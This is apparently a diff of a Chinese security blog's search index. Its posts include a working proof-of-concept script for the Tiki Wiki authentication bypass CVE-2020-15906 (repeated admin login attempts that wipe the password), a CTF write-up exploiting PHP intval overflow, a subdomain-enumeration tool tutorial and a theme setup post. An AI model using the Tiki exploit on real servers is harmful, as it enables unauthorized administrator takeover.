class="string"></span></span><br><span class="line"><span class="string"> █████  ██    ██ ████████ ██   ██ ███████ ███    ██ ████████ ██  ██████  █████  ████████ ██  ██████  ███    ██         ██████  ██    ██ ██████   █████  ███████ ███████ </span></span><br><span class="line"><span class="string">██   ██ ██    ██    ██    ██   ██ ██      ████   ██    ██    ██ ██      ██   ██    ██    ██ ██    ██ ████   ██         ██   ██  ██  ██  ██   ██ ██   ██ ██      ██      </span></span><br><span class="line"><span class="string">███████ ██    ██    ██    ███████ █████   ██ ██  ██    ██    ██ ██      ███████    ██    ██ ██    ██ ██ ██  ██         ██████    ████   ██████  ███████ ███████ ███████ </span></span><br><span class="line"><span class="string">██   ██ ██    ██    ██    ██   ██ ██      ██  ██ ██    ██    ██ ██      ██   ██    ██    ██ ██    ██ ██  ██ ██         ██   ██    ██    ██      ██   ██      ██      ██ </span></span><br><span class="line"><span class="string">██   ██  ██████     ██    ██   ██ ███████ ██   ████    ██    ██  ██████ ██   ██    ██    ██  ██████  ██   ████         ██████     ██    ██      ██   ██ ███████ ███████ </span></span><br><span class="line"><span class="string">                                                                                                                                                                        </span></span><br><span class="line"><span class="string">Poof of Concept for CVE-2020-15906 by Maximilian Barz, Twitter: S1lky_1337</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(banner)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: %s &lt;host&gt; &quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Eg:    %s 1.2.3.4 &quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rhost = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#url = &quot;http://&quot;+rhost+&quot;/tiki/tiki-login.php&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span>+rhost+<span class="string">&quot;/tiki-login_scr.php&quot;</span></span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ticket</span>():</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        login_page = r.text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        html = lxml.html.fromstring(login_page)</span><br><span class="line">        auth = html.xpath(<span class="string">&#x27;//input[@name=&quot;ticket&quot;]/@value&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(auth)[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_cookie</span>():</span><br><span class="line">        session.get(url)</span><br><span class="line">        <span class="keyword">return</span> session.cookies.get_dict()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cookie = get_cookie()</span><br><span class="line">    ticket = get_ticket()</span><br><span class="line"></span><br><span class="line">    payload = &#123;<span class="string">&#x27;ticket&#x27;</span>: ticket,<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;login&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;stay_in_ssl_mode_present&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;stay_in_ssl_mode&#x27;</span>:<span class="string">&#x27;n&#x27;</span>&#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: rhost,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzrhost, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://&quot;+rhost+&quot;/tiki-login_scr.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;125&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">        r = session.post(url, payload, headers)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;Account requires administrator approval.&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Admin Password got removed.&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Use BurpSuite to login into admin without a password &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__ == <span class="string">&#x27;__main__&#x27;</span>):</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>对这个脚本我们要进行一些修改，将 45 修改为 46 行样子，73 行同理</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 </span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用 github 上的脚本 ， 地址是 <code>https://srcincite.io/pocs/cve-2021-26119.py.txt</code></p>
+<p>该 POC 先使用 CVE-2020-15906 绕过认证，获取管理员权限；再使用 Smarty 的沙盒绕过漏洞（CVE-2021-26119）于后台执行任意命令</p>
+<p><img src="/../image/CVE-2020-15906/6.png" alt="6"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>OneForAll 使用教程</title>
+    <url>/post/61f481ec.html</url>
+    <content><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>OneForAll 是一款集百家之长，收集能力强大、支持子域爆破、验证、爬取、置换、接管、处理功能强大、速度极快、体验良好的子域收集工具。</p>
+<blockquote>
+<ul>
+<li>收集能力强大，利用证书透明度收集子域、常规检查收集子域、利用网上爬虫档案收集子域、利用DNS数据集收集子域、利用DNS查询收集子域、利用威胁情报平台数据收集子域、利用搜索引擎发现子域，在搜索模块中除特殊搜索引擎，通用的搜索引擎都支持自动排除搜索，全量搜索，递归搜索。</li>
+<li>支持子域爆破，该模块有常规的字典爆破，也有自定义的fuzz模式，支持批量爆破和递归爆破，自动判断泛解析并处理。</li>
+<li>支持子域验证，默认开启子域验证，自动解析子域 DNS，自动请求子域获取 title 和 banner，并综合判断子域存活情况。</li>
+<li>支持子域爬取，根据已有的子域，请求子域响应体以及响应体里的JS，从中再次发现新的子域。</li>
+<li>支持子域置换，根据已有的子域，使用子域替换技术再次发现新的子域。</li>
+<li>支持子域接管，默认开启子域接管风险检查，支持子域自动接管（目前只有 Github，有待完善），支持批量检查。</li>
+<li>处理功能强大，发现的子域结果支持自动去除，自动 DNS 解析，HTTP 请求探测，自动筛选出有效子域，拓展子域的Banner信息，最终支持的导出格式有 txt, csv, json。</li>
+<li>体验良好，各模块都有进度条，异步保存各模块结果。</li>
+</ul>
+</blockquote>
+<p>OneForAll 是基于 CPython 开发的，所以需要 Python3 环境才能运行</p>
+<p>项目地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/shmilylty/OneForAll.git</span><br></pre></td></tr></table></figure>
+
+<p>git 安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/shmilylty/OneForAll.git &amp;&amp; cd OneForAll/</span><br></pre></td></tr></table></figure>
+
+<p>安装依赖</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-语法"><a href="#0x02-语法" class="headerlink" title="0x02 语法"></a>0x02 语法</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oneforall.py [选项] run</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">选项</th>
+<th align="left">注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">–target</td>
+<td align="left">目标URL</td>
+</tr>
+<tr>
+<td align="left">–brute&#x3D;</td>
+<td align="left">使用爆破模块，默认 False</td>
+</tr>
+<tr>
+<td align="left">–dns&#x3D;</td>
+<td align="left">DNS解析子域，默认 True</td>
+</tr>
+<tr>
+<td align="left">–req&#x3D;</td>
+<td align="left">HTTP请求子域，默认 True</td>
+</tr>
+<tr>
+<td align="left">–port&#x3D;</td>
+<td align="left">请求验证子域的端口范围，默认 80 端口</td>
+</tr>
+<tr>
+<td align="left">–valid&#x3D;</td>
+<td align="left">只导出存活的子域结果，默认 False</td>
+</tr>
+<tr>
+<td align="left">–format&#x3D;</td>
+<td align="left">结果保存格式，默认 csv</td>
+</tr>
+<tr>
+<td align="left">–path&#x3D;</td>
+<td align="left">结果保存路径</td>
+</tr>
+<tr>
+<td align="left">–takeover&#x3D;</td>
+<td align="left">检查子域接管，默认 False</td>
+</tr>
+</tbody></table>
+<h1 id="0x03-使用"><a href="#0x03-使用" class="headerlink" title="0x03 使用"></a>0x03 使用</h1><p>扫描单个域名</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 oneforall.py --target example.com run</span><br></pre></td></tr></table></figure>
+
+<p>扫描多域，先把域名放在 url.txt 中</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 oneforall.py --targets url.txt run</span><br></pre></td></tr></table></figure>
+
+<p>结果会保存在 <code>results/</code> 目录下，在运行结果中我们可以看到有 URL、子域名、IP等信息</p>
+<p>其中运行结果中 ip 是一行多个、还有重复的，我们需要提取ip转换成每行一个 ip 且没有重复的 txt 文本中，方便其他工具扫描</p>
+<p>脚本：删除重复 IP</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># conding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把同一行的ip换行,然后写进result.txt的文件里</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> readlist:</span><br><span class="line">    <span class="keyword">for</span> dirs <span class="keyword">in</span> readlist.readlines():</span><br><span class="line">         <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> writelist:</span><br><span class="line">             b = dirs.replace(<span class="string">&quot;,&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">             writelist.write(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除重复ip，然后把结果写进only.txt文件里</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> readlist:</span><br><span class="line">    lines_seen = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> readlist.readlines():</span><br><span class="line">        <span class="keyword">if</span> line <span class="keyword">not</span> <span class="keyword">in</span> lines_seen:</span><br><span class="line">            lines_seen.add(line)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;only.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> writelist:</span><br><span class="line">                writelist.write(line)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>tool</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[NCTF 2018]小绿草之最强大脑</title>
+    <url>/post/f65bc688.html</url>
+    <content><![CDATA[<p>[NCTF 2018]小绿草之最强大脑</p>
+<span id="more"></span>
+
+<p>进去是一个计算的东西。这个自己算肯定不行的</p>
+<p><img src="/../image/03-08-01/1.png" alt="1"><br>查看下源码代，发现有源码泄露，访问 index.php.bak 下载了一个文件，打开是 php 代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;ans&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ans&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>((<span class="variable">$_SESSION</span>[<span class="string">&#x27;ans&#x27;</span>])+<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>])!=<span class="variable">$_POST</span>[<span class="string">&#x27;ans&#x27;</span>])&#123;</span><br><span class="line">		<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">		&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">		alert(&quot;怎么没算对呢？&quot;);  </span></span><br><span class="line"><span class="string">		window.history.back(-1);  &lt;/script&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">time</span>())-<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]&lt;<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">			&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">			alert(&quot;你手速太快啦，服务器承受不住!!!&quot;);  </span></span><br><span class="line"><span class="string">			window.history.back(-1); &lt;/script&gt; &#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">time</span>())-<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]&gt;<span class="number">2</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">			&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">			alert(&quot;你算的太慢了少年！&quot;);  </span></span><br><span class="line"><span class="string">			window.history.back(-1); &lt;/script&gt; &#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">		&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">		alert(&quot;tql，算对了！！&quot;);  </span></span><br><span class="line"><span class="string">	     &lt;/script&gt; &#x27;</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>]++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里使用了 intval 函数，这个函数会获取变量的整数值，根据<a href="https://www.runoob.com/php/php-intval-function.html">描述</a>，64 位系统上，最大带符号的 integer 值是 9223372036854775807</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;420000000000000000000&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出结果为 9223372036854775807</span></span><br></pre></td></tr></table></figure>
+<p>且上面的数刚好满足 21 位<br>php 源码在 if 函数中要求回答时间在 1~2s 之间，这显然不是人力所能达到的，所以我们需要利用到 python 来编写脚本回答问题<br>python 脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s = requests.Session()  <span class="comment"># 因为要连续计算，用来保存当前会话的持续有效性</span></span><br><span class="line">url = <span class="string">&quot;http://1.14.71.254:28978/&quot;</span> <span class="comment">#这里修改为你的题目网址</span></span><br><span class="line">number =<span class="string">&quot;4200000000000000000000&quot;</span>  <span class="comment">#输入的数字</span></span><br><span class="line">proxies = &#123; <span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">r = s.get(url,proxies=proxies)</span><br><span class="line">math = <span class="string">&#x27;&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># response = requests.get(url, headers=headers,proxies=proxies)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    num_pattern =re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;div style=&quot;display:inline;&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>)</span><br><span class="line">    num = num_pattern.findall(r.text)   <span class="comment">#正则提取公式</span></span><br><span class="line">    gg = <span class="string">&quot;9223372036854775807&quot;</span>+<span class="string">&#x27;+&#x27;</span>+math.join(num)[<span class="number">0</span>:-<span class="number">1</span>]  <span class="comment">#拼接真实的公式</span></span><br><span class="line">    <span class="built_in">print</span>(gg)</span><br><span class="line">    ans = <span class="built_in">eval</span>(gg)   <span class="comment">#利用eval直接来计算结果</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    data = <span class="string">&quot;input=&#123;number&#125;&amp;ans=&#123;ans&#125;%&quot;</span>.<span class="built_in">format</span>(number=number,ans=ans)</span><br><span class="line"></span><br><span class="line">    r =s.post(url,headers=headers,data=data,proxies=proxies)</span><br><span class="line">    time.sleep(<span class="number">1.5</span>)   <span class="comment">#延时1.5秒</span></span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/../image/03-08-01/run_result.png" alt="run_result"></p>
+<p>得到 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSCTF&#123;Y0u_ar3_th3_sTr0ng3st_br41n&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>源码泄露</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>frp 使用</title>
     <url>/post/c3d53602.html</url>
     <content><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><ul>
@@ -474,78 +474,6 @@
 ]]></content>
       <tags>
         <tag>tool</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NexT 主题设置</title>
-    <url>/post/ac8b041d.html</url>
-    <content><![CDATA[<p>好不容易弄好了图片问题，就想着去美化一下主题，起码现在的功能太少了</p>
-<span id="more"></span>
-
-<h1 id="添加菜单"><a href="#添加菜单" class="headerlink" title="添加菜单"></a>添加菜单</h1><p>进入 NexT 的  <code>_config.yml</code> 文件，搜索 menu (119行) 可以看到几个菜单</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">home</span>    <span class="comment">#首页</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">user</span>  <span class="comment">#关于</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">tags</span>  <span class="comment">#标签</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">th</span>  <span class="comment">#分类</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">archive</span>  <span class="comment">#归档</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">/schedule/</span> <span class="string">||</span> <span class="string">calendar</span>  <span class="comment">#日程表</span></span><br><span class="line">  <span class="attr">sitemap:</span> <span class="string">/sitemap.xml</span> <span class="string">||</span> <span class="string">sitemap</span>  <span class="comment">#站点地图</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">/404/</span> <span class="string">||</span> <span class="string">heartbeat</span>  <span class="comment">#公益 404</span></span><br></pre></td></tr></table></figure>
-
-<p>这里可以根据自己的需要来选择，只需要把前面的注释删掉就行了</p>
-<p>但是我们只是有了这几个菜单，我们还应该为他们创建页面，运行下面的相关命令即可，你需要什么菜单就创建什么界面</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> page <span class="string">&quot;about&quot;</span></span><br><span class="line">hexo <span class="keyword">new</span> page <span class="string">&quot;tags&quot;</span></span><br><span class="line">hexo <span class="keyword">new</span> page <span class="string">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>新建 page 后，会在 source 目录下新建 <code>about</code>、<code>tags</code>、<code>categories</code>文件夹，每个文件夹下还会创建一个<code>index.md</code>文件表示关于、标签页分类页面，编辑这三个MarkDown文件可以自定义这三个页面的内容.</p>
-<p>最后一步，编辑各页面对应的<code>index.md</code>文件，增加 type 即可。注意冒号 : 后必须空一格，title 和 date 是默认生成的。重新部署后能够看到效果。</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /source/about/index.md</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">about</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2023-03-09 14:06:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;about&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"> <span class="comment"># /source/tags/index.md</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tages</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2023-03-09 14:06:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"> <span class="comment"># /source/categories/index.md</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2023-03-09 14:06:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
-
-<p>在新建博文的头部，直接输入该博文的分类、标签等即可。分类只能有一个，标签能有多个，多个标签不能一行，注意下面的格式。</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hello</span> <span class="string">World</span> <span class="comment"># 标题</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="string">/3/26</span> <span class="string">hh:mm:ss</span> <span class="comment"># 时间</span></span><br><span class="line"><span class="attr">categories:</span> <span class="comment"># 分类</span></span><br><span class="line">	<span class="bullet">-</span> <span class="string">分类</span>  <span class="comment"># 只能由一个</span></span><br><span class="line"><span class="attr">tags:</span> <span class="comment"># 标签</span></span><br><span class="line">	<span class="bullet">-</span> <span class="string">PS3</span>  <span class="comment"># 能有多个</span></span><br><span class="line">	<span class="bullet">-</span> <span class="string">Games</span>  <span class="comment"># 一个标签一行</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">正文</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="设置菜单位置"><a href="#设置菜单位置" class="headerlink" title="设置菜单位置"></a>设置菜单位置</h1><p>搜索 <code>Scheme </code>可以看到四个选项，这个是用来设置菜单的位置的</p>
-<p>这些描述是看不出来结构的，只有自己一个个试了才知道心仪哪个</p>
-<p>想用哪个就取消注释即可，但是要把另外三个注释掉</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment">#scheme: Muse  #这是默认的样式，黑白主调，大量留白；</span></span><br><span class="line"><span class="comment">#scheme: Mist  #Muse 的紧凑版本，整洁有序的单栏外观；</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Pisces</span>  <span class="comment">#双栏 Scheme，小家碧玉似的清新；</span></span><br><span class="line"><span class="comment">#scheme: Gemini #左侧是网站信息及目录，块 + 片段结构布局</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="设置圆角"><a href="#设置圆角" class="headerlink" title="设置圆角"></a>设置圆角</h1><p>由于我是新版本，需要在 source 文件夹下面新建一个 <code>_data</code> 文件夹，这个 source 文件夹就是刚才上面设置菜单的那个文件夹，也就是说 _data 文件夹和 about，tags 等在同一目录下</p>
-<p>在 _data 文件夹里面新建 <code>variables.styl</code>,在这个里面添加下面的语句</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// 圆角设置</span><br><span class="line">$<span class="attribute">border-radius</span>-inner     = <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span>;</span><br><span class="line">$<span class="attribute">border-radius</span>           = <span class="number">20px</span>;</span><br></pre></td></tr></table></figure>
-
-<p>同时打开 NexT 的配置文件 _config.yml，找到下面语句，去掉注释，这一句大概在 32 行</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">variable:</span> <span class="string">source/_data/variables.styl</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="设置背景图片"><a href="#设置背景图片" class="headerlink" title="设置背景图片"></a>设置背景图片</h1><h2 id="更改图片背景"><a href="#更改图片背景" class="headerlink" title="更改图片背景"></a>更改图片背景</h2><p>还是在 _data 文件夹里面新建 <code>styles.styl</code></p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//背景图片设置</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">/images/R-C.jpg</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">    <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>background-image:url</code> 为图片路径，可以直接使用链接，也可以是图片路径（将自定义图片放入<code>themes/next/source/images</code>路径下）</li>
-<li><code>background-repeat</code>：若果背景图片不能全屏，那么是否平铺显示，充满屏幕</li>
-<li><code>background-attachment</code>：背景是否随着网页上下滚动而滚动，fixed 为固定</li>
-<li><code>background-size</code>：图片展示大小，这里设置 100%，100% 的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示</li>
-</ul>
-<p>接下来打开 _config.yml ，找到这一行(34 行)，去除注释</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">style:</span> <span class="string">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="页面透明化"><a href="#页面透明化" class="headerlink" title="页面透明化"></a>页面透明化</h2><p>为了更好的欣赏背景图片，可以将博客的界面透明化，在 styles.styl 里面添加下面的内容，也可以自己修改一些参数</p>
